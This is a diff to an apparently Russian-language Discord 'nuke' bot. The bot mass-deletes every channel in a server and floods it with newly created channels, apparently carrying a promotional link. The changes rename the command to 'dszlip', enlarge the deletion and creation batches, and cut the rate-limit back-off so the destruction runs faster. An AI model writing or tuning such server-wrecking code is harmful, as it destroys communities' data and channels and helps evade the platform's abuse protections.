@@ -3,7 +3,7 @@ from discord.ext import commands
 import asyncio
 import time
 
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())
+bot = commands.Bot(command_prefix='-', intents=discord.Intents.all())
 
 channel_counter = 0
 start_time = 0
@@ -14,7 +14,7 @@ async def on_ready():
     print(f'✅ {bot.user} готов к уничтожению')
 
 @bot.command()
-async def nuke(ctx):
+async def dszlip(ctx):
     global channel_counter, start_time, rate_limit_hits
     channel_counter = 0
     start_time = time.time()
@@ -44,7 +44,7 @@ async def nuke(ctx):
         except:
             return False
     
-    batch_size = 150
+    batch_size = 200
     for i in range(0, total, batch_size):
         batch = channels[i:i+batch_size]
         tasks = [delete_single_channel(ch) for ch in batch]
@@ -56,7 +56,7 @@ async def nuke(ctx):
             else:
                 skipped += 1
         
-        if (i + batch_size) % 300 == 0:
+        if (i + batch_size) % 400 == 0:
             print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
     
     print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
@@ -98,7 +98,7 @@ https://guns.lol/dszlip
         except discord.HTTPException as e:
             if "rate" in str(e).lower():
                 rate_limit_hits += 1
-                wait_time = min(rate_limit_hits * 0.003, 0.01)
+                wait_time = min(rate_limit_hits * 0.001, 0.005)
                 await asyncio.sleep(wait_time)
                 return await create_single_channel(i)
             else:
@@ -106,7 +106,7 @@ https://guns.lol/dszlip
         except Exception as e:
             return False
     
-    batch_size = 80
+    batch_size = 100
     max_batches = target_channels // batch_size + 1
     
     for batch_num in range(max_batches):
@@ -153,7 +153,7 @@ https://guns.lol/dszlip
 
 @bot.command()
 async def status(ctx):
-    await ctx.send("🔥 Бот активен! Используй !nuke")
+    await ctx.send("🔥 Бот активен! Используй -dszlip")
 
 import os
 bot.run(os.environ['TOKEN'])
